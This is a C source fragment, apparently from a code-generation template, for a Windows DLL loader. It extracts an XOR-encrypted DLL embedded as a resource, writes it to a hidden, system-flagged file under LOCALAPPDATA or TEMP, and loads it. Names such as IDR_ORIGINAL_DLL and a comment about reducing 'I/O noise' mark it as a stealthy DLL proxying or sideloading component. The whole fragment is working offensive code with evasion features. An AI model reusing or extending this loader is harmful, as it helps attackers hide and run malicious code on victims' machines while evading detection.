/* --- Extract embedded DLL and load it --- */
static void _mkdirs(const char *path) {
    char buf[MAX_PATH];
    lstrcpyA(buf, path);
    for (char *p = buf; *p; p++) {
        if (*p == '\\') {
            *p = '\0';
            CreateDirectoryA(buf, NULL);
            *p = '\\';
        }
    }
    CreateDirectoryA(buf, NULL);
}

static BOOL load_embedded_dll(void) {
    HRSRC hRes = FindResourceA(hSelf, MAKEINTRESOURCEA(IDR_ORIGINAL_DLL), "BINARY");
    if (!hRes) return FALSE;

    HGLOBAL hGlobal = LoadResource(hSelf, hRes);
    if (!hGlobal) return FALSE;

    LPVOID pData = LockResource(hGlobal);
    DWORD dwSize = SizeofResource(hSelf, hRes);
    if (!pData || dwSize == 0) return FALSE;

    char szBase[MAX_PATH];
    if (!GetEnvironmentVariableA("LOCALAPPDATA", szBase, MAX_PATH))
        GetTempPathA(MAX_PATH, szBase);

    char szDir[MAX_PATH];
    lstrcpyA(szDir, szBase);
    lstrcatA(szDir, "\\{{ stash_dir }}");
    _mkdirs(szDir);

    lstrcpyA(szTempPath, szDir);
    lstrcatA(szTempPath, "\\{{ stash_filename }}");

    /* Skip re-extraction if already on disk (reduces I/O noise) */
    if (GetFileAttributesA(szTempPath) != INVALID_FILE_ATTRIBUTES) {
        hOriginalDll = LoadLibraryA(szTempPath);
        if (hOriginalDll) return TRUE;
    }

    /* Decrypt resource data in memory */
    unsigned char *pClear = (unsigned char *)VirtualAlloc(NULL, dwSize, MEM_COMMIT, PAGE_READWRITE);
    if (!pClear) return FALSE;
    const unsigned char *pSrc = (const unsigned char *)pData;
    for (DWORD i = 0; i < dwSize; i++)
        pClear[i] = pSrc[i] ^ _rk[i % _rkl];

    HANDLE hFile = CreateFileA(szTempPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
                               FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM, NULL);
    if (hFile == INVALID_HANDLE_VALUE) { VirtualFree(pClear, 0, MEM_RELEASE); return FALSE; }

    DWORD dwWritten;
    WriteFile(hFile, pClear, dwSize, &dwWritten, NULL);
    CloseHandle(hFile);
    VirtualFree(pClear, 0, MEM_RELEASE);

    if (dwWritten != dwSize) return FALSE;

    hOriginalDll = LoadLibraryA(szTempPath);
    return hOriginalDll != NULL;
}
